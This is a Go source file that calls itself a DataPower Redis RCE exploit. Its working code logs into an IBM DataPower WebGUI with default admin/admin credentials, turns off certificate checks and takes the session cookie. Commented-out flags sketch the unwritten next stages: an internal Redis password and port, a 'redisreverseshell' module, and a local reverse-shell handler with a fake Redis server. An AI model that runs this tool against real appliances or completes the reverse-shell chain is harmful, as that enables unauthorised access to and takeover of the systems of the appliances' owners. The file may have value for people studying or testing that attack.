package main

import (
	"crypto/tls"
	"encoding/xml"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

func main() {
	datapowerIP := flag.String("dpip", "", "Datapower IP Address")
	datapowerWebGUIPort := flag.Int("dpport", 9090, "Datapower WebGUI Port")
	datapowerWebGUIUsername := flag.String("dpwebguiuser", "admin", "Datapower WebGUI Username")
	datapowerWebGUIPassword := flag.String("dpwebguipassword", "admin", "Datapower WebGUI Password")
	/*
		datapowerRedisPassword := flag.String("dpredispasswd", "", "Datapower Internal Redis Password")
		datapowerRedisPort := flag.Int("dpredisport", 16379, "Datapower Internal Redis Port")
		datapowerRedisModule := flag.String("dpredismodule", "redisreverseshell", "Redis Reverse Shell Module")
		localPort := flag.Int("dpredisport", 8888, "Local port to run remote shell handler + fake redis server")
		localIPAddress := flag.String("dpredismodule", "", "local address to run remote shell handler + fake redis server")
	*/
	flag.Parse()
	log.Println("datapower-redis-rce-exploit - Created by Thomas Cope")
	log.Println("Attempting Login to Datapower...")
	endpoint := fmt.Sprintf("https://%s:%d/dp/sys.login", *datapowerIP, *datapowerWebGUIPort)
	loginForm := url.Values{}
	loginForm.Set("user", *datapowerWebGUIUsername)
	loginForm.Set("pass", *datapowerWebGUIPassword)
	loginForm.Set("domain", "default")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //Note: Datapower WebGUI Certs are usally self signed.
	}
	client := &http.Client{Transport: tr}
	r, err := http.NewRequest("POST", endpoint, strings.NewReader(loginForm.Encode()))
	if err != nil {
		log.Fatal(err)
	}
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Content-Length", strconv.Itoa(len(loginForm.Encode())))
	res, err := client.Do(r)
	if err != nil {
		log.Fatal(err)
	}
	if res.Status != "200 OK" {
		log.Fatalf("Datapower login failed. Bad HTTP Return Code - %s", res.Status)
	}
	defer res.Body.Close()
	dpLoginBody, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	type DPLoginResponse struct {
		XMLName  xml.Name `xml:"response"`
		Text     string   `xml:",chardata"`
		Result   string   `xml:"result"`
		SAMLart  string   `xml:"SAMLart"`
		Location string   `xml:"location"`
	}
	var dpLoginResult DPLoginResponse
	err = xml.Unmarshal(dpLoginBody, &dpLoginResult)
	if err != nil {
		log.Fatal(err)
	}
	if dpLoginResult.Result != "success" {
		log.Fatalf("Datapower login failed. Bad XML Return Code - %v+", dpLoginResult)
	}
	log.Println("Datapower Login OK!")
	log.Printf("Datapower Login Token = %s", dpLoginResult.SAMLart)
	log.Println("Exchanging Login token for auth cookie...")
	r, err = http.NewRequest("GET", fmt.Sprintf("https://%s:%d/css/login.css?SAMLart=%s", *datapowerIP, *datapowerWebGUIPort, dpLoginResult.SAMLart), nil)
	if err != nil {
		log.Fatal(err)
	}
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	res, err = client.Do(r)
	if err != nil {
		log.Fatal(err)
	}
	if res.Status != "200 OK" {
		log.Fatalf("Datapower login failed. Bad HTTP Return Code - %s", res.Status)
	}
	defer res.Body.Close()
	doLoginCookie := res.Cookies()
	log.Printf("Got login Cookie OK! - %v+", doLoginCookie)
}
